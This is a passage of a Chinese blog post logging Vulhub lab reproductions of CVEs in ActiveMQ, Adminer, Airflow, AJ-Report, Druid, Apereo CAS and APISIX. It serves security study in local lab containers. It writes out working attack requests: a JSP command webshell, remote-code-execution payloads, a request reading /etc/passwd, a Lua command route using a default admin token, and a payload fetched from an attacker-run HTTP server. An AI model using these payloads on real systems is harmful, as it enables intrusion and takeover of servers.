alt="4"></p><p>然后上传webshell：</p><pre class="line-numbers language-none"><code class="language-none">PUT /fileserver/2.txt HTTP/1.1Host: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 120976&lt;%@ page import="java.io.*"%&gt;&lt;% out.print("Hello&lt;/br&gt;"); String strcmd=request.getParameter("cmd"); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ out.print(line+"&lt;/br&gt;"); }%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/5.jpg" alt="5"></p><p>通过burpsuite的MOVE操作有点略难 这里试了几次有时会报400<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/6.jpg" alt="6"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><pre class="line-numbers language-none"><code class="language-none">MOVE /fileserver/2.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/s.jspHost: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问webshell（需要登录）：<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/7.jpg" alt="7"></p><h1 id="Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）"><a href="#Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）" class="headerlink" title="Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）"></a>Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt</a></li><li><a href="https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，访问<code>/api/jolokia/list</code>这个API可以查看当前服务器里所有的MBeans： cv            </p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/10.jpg" alt="10"></p><blockquote><p>是使用<code>org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean</code>，这是由Log4j2提供的一个MBean。<br>攻击者使用这个MBean中的<code>setConfigText</code>操作可以更改Log4j的配置，进而将日志文件写入任意目录中。<br>使用<a href="poc.py">poc</a>脚本来复现完整的过程：</p><pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py -u admin -p admin http://your-ip:8161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/8.jpg" alt="8"></p><blockquote><p>Webshell被写入在<code>/admin/shell.jsp</code>文件中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/9.jpg" alt="9"></p><blockquote><p>这个方法受到ActiveMQ版本的限制，因为Log4j2是在5.17.0中才引入Apache ActiveMQ。</p></blockquote><h1 id="Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）"><a href="#Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）" class="headerlink" title="Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）"></a>Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/news/cve-2023-46604">https://activemq.apache.org/news/cve-2023-46604</a></li><li><a href="https://xz.aliyun.com/t/12929">https://xz.aliyun.com/t/12929</a></li><li><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></li><li><a href="https://forum.butian.net/share/2566">https://forum.butian.net/share/2566</a></li></ul></blockquote><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，启动一个HTTP反连服务器，其中包含我们的<a href="poc.xml">poc.xml</a>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -m http.server 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，执行<a href="poc.py">poc.py</a>，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml的反连平台URL：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 poc.py target port http://ip of http server/poc.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行完成后，进入ActiveMQ容器：</p><pre class="line-numbers language-none"><code class="language-none">docker exec cve-2023-46604-activemq-1 ls -l /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/11.jpg" alt="11"><br>使用python开启http反连服务器时,目录即为命令行的开启目录<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/12.jpg" alt="12"></p><blockquote><p>可见，<code>touch /tmp/activeMQ-RCE-success</code>已经被成功执行：</p></blockquote><h1 id="Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）"><a href="#Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）" class="headerlink" title="Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）"></a>Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。</p><p>参考连接：</p><ul><li><a href="https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6">https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6</a></li><li><a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml</a></li></ul></blockquote><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Adminer登录页面，选择ElasticSearch作为系统目标，并在server字段填写<code>example.com</code>，点击登录即可看到<code>example.com</code>返回的400错误页面展示在页面中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/13.jpg" alt="13"></p><h1 id="Adminer远程文件读取（CVE-2021-43008）"><a href="#Adminer远程文件读取（CVE-2021-43008）" class="headerlink" title="Adminer远程文件读取（CVE-2021-43008）"></a>Adminer远程文件读取（CVE-2021-43008）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/p0dalirius/CVE-2021-43008-AdminerRead">https://github.com/p0dalirius/CVE-2021-43008-AdminerRead</a></li><li><a href="http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></li></ul></blockquote><h2 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>使用<a href="https://github.com/4ra1n/mysql-fake-server">mysql-fake-server</a>启动一个恶意的MySQL服务器。在Adminer登录页面中填写恶意服务地址和用户名<code>fileread_/etc/passwd</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/15.jpg" alt="15"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/16.jpg" alt="16"></p><blockquote><p>可见，我们已经收到客户端连接，读取到的文件<code>/etc/passwd</code>已保存至当前目录：</p></blockquote><p>我这里怎么试都没法返回passwd文件…无奈放弃了<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/17.jpg" alt="17"><br>看起来多半是文件为空导致无法返回 怪欸</p><h1 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）"><a href="#Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）" class="headerlink" title="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）"></a>Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/pberba/CVE-2020-11978">https://github.com/pberba/CVE-2020-11978</a></li></ul></blockquote><h2 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8080</code>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/18.jpg" alt="18"></p><blockquote><p>再点击执行按钮，在Configuration JSON中输入：<code>{"message":"'\";touch /tmp/airflow_dag_success;#"}</code>，再点<code>Trigger</code>执行dag：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/19.jpg" alt="19"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/20.jpg" alt="20"></p><blockquote><p>等几秒可以看到执行成功：<br>到CeleryWorker容器中进行查看：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/21.jpg" alt="21"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/22.jpg" alt="22"></p><p>可以看到成功创建了airflow_dag_success</p><h1 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）"><a href="#Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）" class="headerlink" title="Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）"></a>Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis/RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/apache/airflow/pull/9178">https://github.com/apache/airflow/pull/9178</a></li></ul></blockquote><h2 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。<br> 我们可以使用<a href="exploit_airflow_celery.py">exploit_airflow_celery.py</a>这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip install redispython exploit_airflow_celery.py [your-ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/23.jpg" alt="23"></p><blockquote><p>查看结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker compose logs airflow-worker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到如下任务消息：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/24.jpg" alt="24"></p><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt;docker compose exec airflow-worker ls -l /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到成功创建了文件<code>airflow_celery_success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/25.jpg" alt="25"></p><h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><blockquote><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/14460">https://xz.aliyun.com/t/14460</a></li><li><a href="https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md</a></li></ul></blockquote><h2 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用该漏洞，只需要发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /dataSetParam/verification;swagger-ui/ HTTP/1.1Host: your-ip:9095User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Content-Type: application/json;charset=UTF-8Connection: closeContent-Length: 339{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/26.jpg" alt="26"><br>可见，<code>id</code>命令已经执行成功：</p><h1 id="Apache-Druid-代码执行漏洞（CVE-2021-25646）"><a href="#Apache-Druid-代码执行漏洞（CVE-2021-25646）" class="headerlink" title="Apache Druid 代码执行漏洞（CVE-2021-25646）"></a>Apache Druid 代码执行漏洞（CVE-2021-25646）</h1><blockquote><p>Apache Druid是一个开源的分布式数据存储。</p><p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution">https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution</a></li><li><a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></li></ul></blockquote><h2 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接发送如下请求即可执行其中的JavaScript代码：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">POST /druid/indexer/v1/sampler HTTP/1.1Host: your-ip:8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/json{    "type":"index",    "spec":{        "ioConfig":{            "type":"index",            "firehose":{                "type":"local",                "baseDir":"/etc",                "filter":"passwd"            }        },        "dataSchema":{            "dataSource":"test",            "parser":{                "parseSpec":{                "format":"javascript",                "timestampSpec":{                },                "dimensionsSpec":{                },                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",                "":{                    "enabled":"true"                }                }            }        }    },    "samplerConfig":{        "numRows":10    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/27.jpg" alt="27"><br>可见，<code>id</code>命令已被成功执行：</p><h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h1><blockquote><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li></ul></blockquote><h2 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class EncryptedTranscoder implements Transcoder {    private CipherBean cipherBean;    private boolean compression = true;    public EncryptedTranscoder() throws IOException {        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());        bufferedBlockCipherBean.setKeyAlias("aes128");        bufferedBlockCipherBean.setKeyPassword("changeit");        bufferedBlockCipherBean.setNonce(new RBGNonce());        this.setCipherBean(bufferedBlockCipherBean);    }    // ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><pre class="line-numbers language-none"><code class="language-none">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/28.jpg" alt="28"></p><blockquote><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><pre class="line-numbers language-none"><code class="language-none">POST /cas/login HTTP/1.1Host: your-ipContent-Length: 2287Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://your-ip:8080Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://your-ip:8080/cas/loginAccept-Encoding: gzip, deflateAccept-Language: en,zh-CN;q=0.9,zh;q=0.8Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734Connection: closeusername=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=[payload]&amp;_eventId=submit&amp;submit=LOGIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/29.jpg" alt="29"></p><blockquote><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/30.jpg" alt="30"></p><h1 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h1><blockquote><p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/docs/apisix/getting-started">https://apisix.apache.org/docs/apisix/getting-started</a></li><li><a href="https://github.com/apache/apisix/pull/2244">https://github.com/apache/apisix/pull/2244</a></li><li><a href="https://seclists.org/oss-sec/2020/q4/187">https://seclists.org/oss-sec/2020/q4/187</a></li></ul></blockquote><h2 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p><pre class="line-numbers language-none"><code class="language-none">POST /apisix/admin/routes HTTP/1.1Host: your-ip:9080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeX-API-KEY: edd1c9f034335f136f87ad84b625c8f1Content-Type: application/jsonContent-Length: 406{    "uri": "/attack","script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",    "upstream": {        "type": "roundrobin",        "nodes": {            "example.com:80": 1        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/31.jpg" alt="31"></p><blockquote><p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:9080/attack?cmd=id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/32.jpg" alt="32"></p><h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)"></a>Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)</h1><blockquote><p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p><p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/">https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/</a></li><li><a href="https://github.com/wuppp/cve-2021-45232-exp">https://github.com/wuppp/cve-2021-45232-exp</a></li></ul></blockquote><h2 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先用默认账号密码admin/vulhub来登录网站<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/33.jpg" alt="33"><br>注:默认账号密码可能会因为镜像版本不同而有变化 具体还请查看容器目录下的comfig.yaml</p><p>登陆完之后进入路由页面 新建一个路由<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/34.jpg" alt="34"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/35.jpg" alt="35"><br>至于相关设置直接随意 快速下一步到创建就行了<br>在访问了网站的<code>/apisix/admin/migrate/export</code>目录后获取了一个bak文件 查看后可以发现我们刚刚配置的路由信息被泄露了<img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/36.jpg" alt="36"><br>剩下的过程不好复现 先暂且跳过</p><h1 id="AppWeb认证绕过漏洞（CVE-2018-8715"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715)"></a>AppWeb认证绕过漏洞（CVE-2018-8715)</h1><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>参考链接：</p><ul><li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li></ul></blockquote><h2 id="漏洞复现-12"><a href="#漏洞复现-12" 